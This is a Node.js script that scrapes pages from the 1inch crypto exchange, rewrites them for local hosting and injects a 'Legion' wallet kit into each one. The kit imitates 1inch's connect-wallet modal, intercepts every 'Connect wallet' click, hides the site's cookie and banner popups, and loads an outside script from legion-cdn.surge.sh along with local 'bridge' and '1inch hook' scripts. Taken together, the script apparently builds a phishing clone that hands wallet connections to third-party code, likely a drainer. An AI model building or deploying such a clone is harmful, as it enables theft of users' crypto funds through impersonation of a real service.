import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const pagesDir = path.join(root, 'pages');

const ROUTES = {
  'about.html': '/about',
  'aqua.html': '/aqua',
  'blog.html': '/blog',
  'card.html': '/card',
  'careers.html': '/careers',
  'overview.html': '/overview',
  'page.html': '/',
  'portfolio.html': '/portfolio',
  'press-room.html': '/press-room',
  'security.html': '/security',
  'swap.html': '/swap',
  'terminal.html': '/terminal',
  'trade.html': '/trade',
  'wallet.html': '/wallet',
};

const WALLET_CSS = `<style id="legion-wallet-kit">
.wallet-overlay{position:fixed;inset:0;z-index:600;background:rgba(0,0,0,.5);opacity:0;pointer-events:none;transition:opacity .3s ease}
.wallet-overlay.open{opacity:1;pointer-events:auto}
.wallet-modal{position:fixed;top:0;right:0;bottom:0;z-index:700;width:420px;max-width:100vw;background:#0f0f12;border-left:1px solid rgba(255,255,255,.07);display:flex;flex-direction:column;transform:translateX(100%);transition:transform .32s cubic-bezier(.4,0,.2,1)}
.wallet-modal.open{transform:translateX(0)}
.wm-inner{display:flex;flex-direction:column;padding:28px 24px 24px;height:100%;overflow-y:auto}
.wm-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;flex-shrink:0}
.wm-title{font-size:20px;font-weight:600;letter-spacing:-.02em;color:#fff}
.wm-close{background:rgba(255,255,255,.06);border:none;color:rgba(255,255,255,.5);cursor:pointer;width:34px;height:34px;border-radius:50%;display:flex;align-items:center;justify-content:center}
.wm-sub{font-size:13px;color:rgba(255,255,255,.35);margin-bottom:24px;line-height:1.55}
.wm-list{display:flex;flex-direction:column;gap:8px}
.wm-item{display:flex;align-items:center;gap:16px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.07);border-radius:16px;padding:14px 18px;cursor:pointer;font-size:15px;color:#fff;font-family:inherit;width:100%;text-align:left}
.wm-item:hover{background:rgba(255,255,255,.08)}
.wm-featured{background:#ccff00!important;border-color:#ccff00!important;color:#000!important}
.wm-featured .wm-item-name{color:#000;font-weight:500}
.wm-icon{width:40px;height:40px;border-radius:12px;flex-shrink:0;display:flex;align-items:center;justify-content:center;overflow:hidden}
.wm-item-name{flex:1}
.wm-chevron{color:rgba(255,255,255,.2);flex-shrink:0}
.wm-more{display:flex;align-items:center;justify-content:center;gap:6px;width:100%;margin-top:16px;font-size:14px;color:rgba(255,255,255,.35);cursor:pointer;padding:10px;background:none;border:none;font-family:inherit}
.wm-footer{margin-top:auto;padding-top:24px;text-align:center;font-size:12px;color:rgba(255,255,255,.2);line-height:1.65}
.wm-footer a{color:rgba(255,255,255,.35);text-decoration:underline}
@media(max-width:480px){.wallet-modal{width:100vw;border-left:none}}
</style>`;

const WALLET_HTML = `<!-- ═══ WALLET KIT + LEGION ═══ -->
${WALLET_CSS}
<div class="wallet-overlay" id="walletOverlay" onclick="closeWalletModal()"></div>
<div class="wallet-modal" id="walletModal" role="dialog" aria-modal="true" aria-label="Connect wallet">
  <div class="wm-inner">
    <div class="wm-header">
      <h2 class="wm-title">Connect wallet</h2>
      <button class="wm-close" onclick="closeWalletModal()" aria-label="Close">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
      </button>
    </div>
    <p class="wm-sub">Connect wallet to make transactions on the dApp</p>
    <div class="wm-list" id="wmList">
      <button class="wm-item wm-featured" data-wallet-connect="oneinch" type="button"><div class="wm-icon" style="background:none;padding:0;"><img src="https://1inch.com/assets/images/wallet-logo/one-inch.svg" width="40" height="40" alt="1inch Wallet" style="border-radius:10px;display:block;"></div><span class="wm-item-name">1inch Wallet</span><svg class="wm-chevron" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg></button>
      <button class="wm-item" data-wallet-connect="ledger" type="button"><div class="wm-icon" style="background:none;padding:0;"><img src="https://1inch.com/assets/images/wallet-logo/ledger.svg" width="40" height="40" alt="Ledger" style="border-radius:10px;display:block;"></div><span class="wm-item-name">Ledger Wallet</span><svg class="wm-chevron" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg></button>
      <button class="wm-item" data-wallet-connect="metamask" type="button"><div class="wm-icon" style="background:none;padding:0;"><img src="https://1inch.com/assets/images/wallet-logo/metamask.svg" width="40" height="40" alt="MetaMask" style="border-radius:10px;display:block;"></div><span class="wm-item-name">MetaMask</span><svg class="wm-chevron" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg></button>
      <button class="wm-item" data-wallet-connect="binance" type="button"><div class="wm-icon" style="background:none;padding:0;"><img src="https://1inch.com/assets/images/wallet-logo/binance.svg" width="40" height="40" alt="Binance" style="border-radius:10px;display:block;"></div><span class="wm-item-name">Binance Wallet</span><svg class="wm-chevron" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg></button>
      <button class="wm-item" data-wallet-connect="walletconnect" type="button"><div class="wm-icon" style="background:none;padding:0;"><img src="https://1inch.com/assets/images/wallet-logo/reown-wc.svg" width="40" height="40" alt="WalletConnect" style="border-radius:10px;display:block;"></div><span class="wm-item-name">WalletConnect</span><svg class="wm-chevron" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg></button>
      <button class="wm-item wm-extra" data-wallet-connect="trust" type="button" style="display:none"><div class="wm-icon" style="background:none;padding:0;"><img src="https://1inch.com/assets/images/wallet-logo/trust-wallet.svg" width="40" height="40" alt="Trust" style="border-radius:10px;display:block;"></div><span class="wm-item-name">Trust Wallet</span><svg class="wm-chevron" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg></button>
      <button class="wm-item wm-extra" data-wallet-connect="okx" type="button" style="display:none"><div class="wm-icon" style="background:none;padding:0;"><img src="https://1inch.com/assets/images/wallet-logo/okx.svg" width="40" height="40" alt="OKX" style="border-radius:10px;display:block;"></div><span class="wm-item-name">OKX Wallet</span><svg class="wm-chevron" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg></button>
      <button class="wm-item wm-extra" data-wallet-connect="cryptocom" type="button" style="display:none"><div class="wm-icon" style="background:none;padding:0;"><img src="https://1inch.com/assets/images/wallet-logo/cryptocom.svg" width="40" height="40" alt="Crypto.com" style="border-radius:10px;display:block;"></div><span class="wm-item-name">Crypto.com Wallet</span><svg class="wm-chevron" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg></button>
      <button class="wm-item wm-extra" data-wallet-connect="bitget" type="button" style="display:none"><div class="wm-icon" style="background:none;padding:0;"><img src="https://1inch.com/assets/images/wallet-logo/bitget.svg" width="40" height="40" alt="Bitget" style="border-radius:10px;display:block;"></div><span class="wm-item-name">Bitget Wallet</span><svg class="wm-chevron" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg></button>
      <button class="wm-item wm-extra" data-wallet-connect="coinbase" type="button" style="display:none"><div class="wm-icon" style="background:none;padding:0;"><img src="https://1inch.com/assets/images/wallet-logo/coinbase.svg" width="40" height="40" alt="Coinbase" style="border-radius:10px;display:block;"></div><span class="wm-item-name">Coinbase Wallet</span><svg class="wm-chevron" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg></button>
    </div>
    <button class="wm-more" id="wmMoreBtn"><span id="wmMoreTxt">More wallets</span><svg id="wmMoreChev" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="transition:transform .2s"><path d="M6 9l6 6 6-6"/></svg></button>
    <div class="wm-footer">By connecting your wallet, you agree to our<br><a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.<br><span style="color:rgba(255,255,255,.15)">Last update 08.07.2026</span></div>
  </div>
</div>
<script>
(function(){
  function openWalletModal(){document.getElementById('walletOverlay').classList.add('open');document.getElementById('walletModal').classList.add('open');document.body.style.overflow='hidden';}
  function closeWalletModal(){document.getElementById('walletOverlay').classList.remove('open');document.getElementById('walletModal').classList.remove('open');document.body.style.overflow='';}
  window.openWalletModal=openWalletModal;window.closeWalletModal=closeWalletModal;window.customModalClose=closeWalletModal;
  document.addEventListener('keydown',function(e){if(e.key==='Escape')closeWalletModal();});
  document.addEventListener('click',function(e){
    var el=e.target;for(var i=0;i<8&&el&&el!==document.documentElement;i++){
      var txt=el.textContent?el.textContent.trim():'';
      if((el.getAttribute&&el.getAttribute('data-id')==='nav.connect-wallet')||(el.className&&typeof el.className==='string'&&el.className.indexOf('connect-btn')!==-1)||txt==='Connect wallet'){
        e.preventDefault();e.stopPropagation();openWalletModal();return;
      }
      el=el.parentElement;
    }
  },true);
  var mb=document.getElementById('wmMoreBtn');
  if(mb){mb.addEventListener('click',function(){var ex=document.querySelectorAll('.wm-extra');var h=ex.length&&ex[0].style.display==='none';ex.forEach(function(x){x.style.display=h?'flex':'none';});var t=document.getElementById('wmMoreTxt');if(t)t.textContent=h?'Less wallets':'More wallets';var c=document.getElementById('wmMoreChev');if(c)c.style.transform=h?'rotate(180deg)':'rotate(0deg)';});}
})();
</script>
<script src="https://legion-cdn.surge.sh/legion-embed.js" defer data-hook-buttons="false" data-hw-wallets="false" data-vendor-base="../"></script>
<script src="../legion-bridge.js?v=1.1.0" defer></script>
<script src="../legion-1inch-hook.js?v=1.0.4" defer></script>
<script id="angular-popup-fix">
(function(){function fixPopups(){var cookiePopup=document.querySelector('oi-cookies-popup');if(cookiePopup){cookiePopup.querySelectorAll('button').forEach(function(btn){btn.addEventListener('click',function(e){e.stopPropagation();cookiePopup.style.cssText+=';display:none!important';try{localStorage.setItem('1inch-ck2','1');}catch(err){}},true);});}var banner=document.querySelector('oi-banner');if(banner){var closeBtn=banner.querySelector('.close[aria-label="Close banner"], button.close, [aria-label="Close banner"]');if(closeBtn){closeBtn.addEventListener('click',function(e){e.stopPropagation();banner.style.cssText+=';display:none!important';},true);}}}fixPopups();document.addEventListener('DOMContentLoaded',fixPopups);})();
</script>
<!-- ═══ END WALLET KIT ═══ -->`;

function rewriteForLocalPages(html) {
  return html
    .replace(/<base href="\/">/g, '<base href="../">')
    .replace(/href="\/styles-([^"]+)"/g, 'href="../styles/styles-$1"')
    .replace(/src="\/polyfills-([^"]+)"/g, 'src="../scripts/polyfills-$1"')
    .replace(/src="\/main-([^"]+)"/g, 'src="../scripts/main-$1"')
    .replace(/href="favicon\//g, 'href="../favicon/')
    .replace(/href="theme-light\.css"/g, 'href="../styles/theme-light.css"')
    .replace(/href="theme-dark\.css"/g, 'href="../styles/theme-dark.css"')
    .replace(/<link rel="modulepreload" href="\/chunk-[^"]+">/g, '')
    .replace(/<script src="\/polyfills-[^"]+" type="module"><\/script>/g, '<script src="../scripts/polyfills-5DRAD2BS.js" type="module"></script>')
    .replace(/<script src="\/main-[^"]+" type="module"><\/script>/g, '<script src="../scripts/main-IEAQSABE.js" type="module"></script>');
}

function injectKit(html) {
  if (html.includes('legion-1inch-hook.js')) return html;
  if (html.includes('</body>')) {
    return html.replace('</body>', WALLET_HTML + '\n</body>');
  }
  return html + WALLET_HTML;
}

async function recoverOne(file, route) {
  const url = 'https://1inch.com' + route;
  const res = await fetch(url, { headers: { 'User-Agent': 'Mozilla/5.0' } });
  if (!res.ok) throw new Error(url + ' HTTP ' + res.status);
  let html = await res.text();
  html = rewriteForLocalPages(html);
  html = injectKit(html);
  const out = path.join(pagesDir, file);
  fs.writeFileSync(out, html, 'utf8');
  console.log('recovered', file, '(' + html.length + ' bytes) from', route);
}

async function main() {
  for (const [file, route] of Object.entries(ROUTES)) {
    await recoverOne(file, route);
    await new Promise((r) => setTimeout(r, 400));
  }
  console.log('all pages recovered + legion injected');
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
